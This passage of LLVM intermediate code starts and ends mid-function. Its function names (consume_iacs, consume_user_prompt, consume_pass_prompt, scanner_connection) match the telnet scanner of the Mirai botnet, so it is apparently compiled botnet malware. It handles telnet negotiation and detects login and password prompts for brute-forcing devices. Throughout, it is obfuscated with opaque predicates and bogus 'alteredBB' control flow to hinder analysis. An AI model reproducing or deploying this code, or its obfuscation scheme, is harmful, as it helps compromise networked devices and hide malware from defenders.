; <label>:45:                                     ; preds = %34
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  br i1 %50, label %51, label %81

; <label>:51:                                     ; preds = %45
  %52 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %53 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %53, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = load i8*, i8** %4, align 8
  %56 = call signext i8 @can_consume(%struct.scanner_connection* %54, i8* %55, i32 2)
  %57 = icmp ne i8 %56, 0
  br i1 %57, label %59, label %58

; <label>:58:                                     ; preds = %51
  br label %249

; <label>:59:                                     ; preds = %51
  %60 = load i8*, i8** %4, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 31
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %59
  br label %82

; <label>:66:                                     ; preds = %59
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 3
  store i8* %68, i8** %4, align 8
  %69 = load i32, i32* %3, align 4
  %70 = add nsw i32 %69, 3
  store i32 %70, i32* %3, align 4
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %75 = call i64 @send(i32 %73, i8* %74, i64 3, i32 16384)
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %80 = call i64 @send(i32 %78, i8* %79, i64 9, i32 16384)
  br label %197

; <label>:81:                                     ; preds = %45
  br label %82

; <label>:82:                                     ; preds = %81, %65
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call signext i8 @can_consume(%struct.scanner_connection* %83, i8* %84, i32 2)
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %104, label %87

; <label>:87:                                     ; preds = %82
  %88 = load i32, i32* @x.65
  %89 = load i32, i32* @y.66
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  %96 = load i32, i32* @x.65
  %97 = load i32, i32* @y.66
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %249

; <label>:104:                                    ; preds = %82
  store i32 0, i32* %5, align 4
  br label %105

; <label>:105:                                    ; preds = %originalBBpart214, %104
  %106 = load i32, i32* %5, align 4
  %107 = icmp slt i32 %106, 3
  br i1 %107, label %108, label %187

; <label>:108:                                    ; preds = %105
  %109 = load i32, i32* @x.65
  %110 = load i32, i32* @y.66
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %108
  %117 = load i8*, i8** %4, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 253
  %124 = load i32, i32* @x.65
  %125 = load i32, i32* @y.66
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %123, label %132, label %137

; <label>:132:                                    ; preds = %originalBBpart24
  %133 = load i8*, i8** %4, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  store i8 -4, i8* %136, align 1
  br label %167

; <label>:137:                                    ; preds = %originalBBpart24
  %138 = load i32, i32* @x.65
  %139 = load i32, i32* @y.66
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %137
  %146 = load i8*, i8** %4, align 8
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8, i8* %146, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 251
  %153 = load i32, i32* @x.65
  %154 = load i32, i32* @y.66
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %152, label %161, label %166

; <label>:161:                                    ; preds = %originalBBpart28
  %162 = load i8*, i8** %4, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds i8, i8* %162, i64 %164
  store i8 -3, i8* %165, align 1
  br label %166

; <label>:166:                                    ; preds = %161, %originalBBpart28
  br label %167

; <label>:167:                                    ; preds = %166, %132
  br label %168

; <label>:168:                                    ; preds = %167
  %169 = load i32, i32* @x.65
  %170 = load i32, i32* @y.66
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %168
  %177 = load i32, i32* %5, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %5, align 4
  %179 = load i32, i32* @x.65
  %180 = load i32, i32* @y.66
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart214, label %originalBB10alteredBB

originalBBpart214:                                ; preds = %originalBB10
  br label %105

; <label>:187:                                    ; preds = %105
  %188 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %189 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %188, i32 0, i32 1
  %190 = load i32, i32* %189, align 8
  %191 = load i8*, i8** %4, align 8
  %192 = call i64 @send(i32 %190, i8* %191, i64 3, i32 16384)
  %193 = load i8*, i8** %4, align 8
  %194 = getelementptr inbounds i8, i8* %193, i64 3
  store i8* %194, i8** %4, align 8
  %195 = load i32, i32* %3, align 4
  %196 = add nsw i32 %195, 3
  store i32 %196, i32* %3, align 4
  br label %197

; <label>:197:                                    ; preds = %187, %66
  %198 = load i32, i32* @x.65
  %199 = load i32, i32* @y.66
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %197
  %206 = load i32, i32* @x.65
  %207 = load i32, i32* @y.66
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %214

; <label>:214:                                    ; preds = %originalBBpart218
  %215 = load i32, i32* @x.65
  %216 = load i32, i32* @y.66
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %214
  %223 = load i32, i32* @x.65
  %224 = load i32, i32* @y.66
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %231

; <label>:231:                                    ; preds = %originalBBpart222, %23
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = load i32, i32* @x.65
  %234 = load i32, i32* @y.66
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %232
  %241 = load i32, i32* @x.65
  %242 = load i32, i32* @y.66
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %11

; <label>:249:                                    ; preds = %originalBBpart2, %58, %33, %22, %11
  %250 = load i32, i32* %3, align 4
  ret i32 %250

originalBBalteredBB:                              ; preds = %originalBB, %87
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %108
  %251 = load i8*, i8** %4, align 8
  %252 = load i32, i32* %5, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i8, i8* %251, i64 %253
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 253
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %137
  %258 = load i8*, i8** %4, align 8
  %259 = load i32, i32* %5, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8, i8* %258, i64 %260
  %262 = load i8, i8* %261, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp eq i32 %263, 251
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %168
  %265 = load i32, i32* %5, align 4
  %_ = sub i32 %265, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 %265, 1
  %gen12 = mul i32 %_11, 1
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %5, align 4
  br label %originalBB10

originalBB16alteredBB:                            ; preds = %originalBB16, %197
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %214
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %232
  br label %originalBB24
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

; <label>:15:                                     ; preds = %115, %1
  %16 = load i32, i32* @x.67
  %17 = load i32, i32* @y.68
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i32, i32* %5, align 4
  %25 = icmp sgt i32 %24, 0
  %26 = load i32, i32* @x.67
  %27 = load i32, i32* @y.68
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %118

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.67
  %36 = load i32, i32* @y.68
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %44 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %43, i32 0, i32 7
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [256 x i8], [256 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 58
  %51 = load i32, i32* @x.67
  %52 = load i32, i32* @y.68
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %50, label %111, label %59

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 7
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %61, i64 0, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 62
  br i1 %67, label %111, label %68

; <label>:68:                                     ; preds = %59
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 7
  %71 = load i32, i32* %5, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %70, i64 0, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp eq i32 %75, 36
  br i1 %76, label %111, label %77

; <label>:77:                                     ; preds = %68
  %78 = load i32, i32* @x.67
  %79 = load i32, i32* @y.68
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 7
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %87, i64 0, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 35
  %94 = load i32, i32* @x.67
  %95 = load i32, i32* @y.68
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %93, label %111, label %102

; <label>:102:                                    ; preds = %originalBBpart28
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 7
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [256 x i8], [256 x i8]* %104, i64 0, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp eq i32 %109, 37
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %102, %originalBBpart28, %68, %59, %originalBBpart24
  %112 = load i32, i32* %5, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %6, align 4
  br label %118

; <label>:114:                                    ; preds = %102
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* %5, align 4
  %117 = add nsw i32 %116, -1
  store i32 %117, i32* %5, align 4
  br label %15

; <label>:118:                                    ; preds = %111, %originalBBpart2
  %119 = load i32, i32* %6, align 4
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %187

; <label>:121:                                    ; preds = %118
  %122 = load i32, i32* @x.67
  %123 = load i32, i32* @y.68
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %130 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %130, i8** %9, align 8
  %131 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %131, i8** %10, align 8
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 7
  %134 = getelementptr inbounds [256 x i8], [256 x i8]* %133, i32 0, i32 0
  %135 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %135, i32 0, i32 6
  %137 = load i32, i32* %136, align 4
  %138 = load i8*, i8** %9, align 8
  %139 = load i32, i32* %8, align 4
  %140 = sub nsw i32 %139, 1
  %141 = call i32 @util_memsearch(i8* %134, i32 %137, i8* %138, i32 %140)
  %142 = icmp ne i32 %141, -1
  %143 = zext i1 %142 to i32
  store i32 %143, i32* %7, align 4
  %144 = load i32, i32* @x.67
  %145 = load i32, i32* @y.68
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %142, label %152, label %154

; <label>:152:                                    ; preds = %originalBBpart212
  %153 = load i32, i32* %7, align 4
  store i32 %153, i32* %6, align 4
  br label %186

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %156 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %155, i32 0, i32 7
  %157 = getelementptr inbounds [256 x i8], [256 x i8]* %156, i32 0, i32 0
  %158 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %159 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %158, i32 0, i32 6
  %160 = load i32, i32* %159, align 4
  %161 = load i8*, i8** %10, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sub nsw i32 %162, 1
  %164 = call i32 @util_memsearch(i8* %157, i32 %160, i8* %161, i32 %163)
  %165 = icmp ne i32 %164, -1
  %166 = zext i1 %165 to i32
  store i32 %166, i32* %7, align 4
  br i1 %165, label %167, label %169

; <label>:167:                                    ; preds = %154
  %168 = load i32, i32* %7, align 4
  store i32 %168, i32* %6, align 4
  br label %169

; <label>:169:                                    ; preds = %167, %154
  %170 = load i32, i32* @x.67
  %171 = load i32, i32* @y.68
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %169
  %178 = load i32, i32* @x.67
  %179 = load i32, i32* @y.68
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %186

; <label>:186:                                    ; preds = %originalBBpart216, %152
  br label %187

; <label>:187:                                    ; preds = %186, %118
  %188 = load i32, i32* @x.67
  %189 = load i32, i32* @y.68
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %187
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %196 = load i32, i32* %6, align 4
  %197 = icmp eq i32 %196, -1
  %198 = load i32, i32* @x.67
  %199 = load i32, i32* @y.68
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %197, label %206, label %207

; <label>:206:                                    ; preds = %originalBBpart220
  store i32 0, i32* %2, align 4
  br label %209

; <label>:207:                                    ; preds = %originalBBpart220
  %208 = load i32, i32* %6, align 4
  store i32 %208, i32* %2, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %206
  %210 = load i32, i32* %2, align 4
  ret i32 %210

originalBBalteredBB:                              ; preds = %originalBB, %15
  %211 = load i32, i32* %5, align 4
  %212 = icmp sgt i32 %211, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %213 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %213, i32 0, i32 7
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [256 x i8], [256 x i8]* %214, i64 0, i64 %216
  %218 = load i8, i8* %217, align 1
  %219 = sext i8 %218 to i32
  %220 = icmp eq i32 %219, 58
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %221 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %222 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %221, i32 0, i32 7
  %223 = load i32, i32* %5, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %222, i64 0, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = sext i8 %226 to i32
  %228 = icmp eq i32 %227, 35
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %229 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %229, i8** %9, align 8
  %230 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %230, i8** %10, align 8
  %231 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %231, i32 0, i32 7
  %233 = getelementptr inbounds [256 x i8], [256 x i8]* %232, i32 0, i32 0
  %234 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %235 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %234, i32 0, i32 6
  %236 = load i32, i32* %235, align 4
  %237 = load i8*, i8** %9, align 8
  %238 = load i32, i32* %8, align 4
  %_ = sub i32 %238, 1
  %gen = mul i32 %_, 1
  %239 = sub nsw i32 %238, 1
  %240 = call i32 @util_memsearch(i8* %233, i32 %236, i8* %237, i32 %239)
  %241 = icmp ne i32 %240, -1
  %242 = zext i1 %241 to i32
  store i32 %242, i32* %7, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %169
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %187
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %243 = load i32, i32* %6, align 4
  %244 = icmp eq i32 %243, -1
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %originalBBpart29, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %108

; <label>:17:                                     ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %69, label %26

; <label>:26:                                     ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %69, label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* @x.69
  %37 = load i32, i32* @y.70
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 36
  %52 = load i32, i32* @x.69
  %53 = load i32, i32* @y.70
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %51, label %69, label %60

; <label>:60:                                     ; preds = %originalBBpart2
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 7
  %63 = load i32, i32* %5, align 4
